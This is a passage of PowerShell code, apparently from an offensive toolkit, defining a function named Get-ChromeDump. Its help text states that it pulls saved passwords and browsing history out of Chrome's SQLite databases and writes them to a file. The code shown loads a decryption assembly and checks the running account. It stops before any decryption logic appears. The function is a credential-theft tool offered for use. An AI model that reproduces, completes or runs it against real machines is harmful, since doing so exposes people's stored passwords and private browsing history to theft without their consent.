Function Get-ChromeDump{

  <#
  .SYNOPSIS
  This function returns any passwords and history stored in the chrome sqlite databases.

  .DESCRIPTION
  This function uses the System.Data.SQLite assembly to parse the different sqlite db files used by chrome to save passwords and browsing history. The System.Data.SQLite assembly
  cannot be loaded from memory. This is a limitation for assemblies that contain any unmanaged code and/or compiled without the /clr:safe option.

  .PARAMETER OutFile
  Switch to dump all results out to a file.

  .EXAMPLE

  Get-ChromeDump -OutFile "$env:HOMEPATH\chromepwds.txt"

  Dump All chrome passwords and history to the specified file

  .LINK
  http://www.xorrior.com

  #>

  [CmdletBinding()]
  param(
    [Parameter(Mandatory = $False)]
    [string]$OutFile
  )
    #Add the required assembly for decryption

    Add-Type -Assembly System.Security

    #Check to see if the script is being run as SYSTEM. Not going to work.
    if(([System.Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem){
      Write-Warning "Unable to decrypt passwords contained in Login Data file as SYSTEM."
      $NoPasswords = $True
    }

    if([IntPtr]::Size -eq 8)
    {
        #64 bit version
    }
    else
    {
        #32 bit version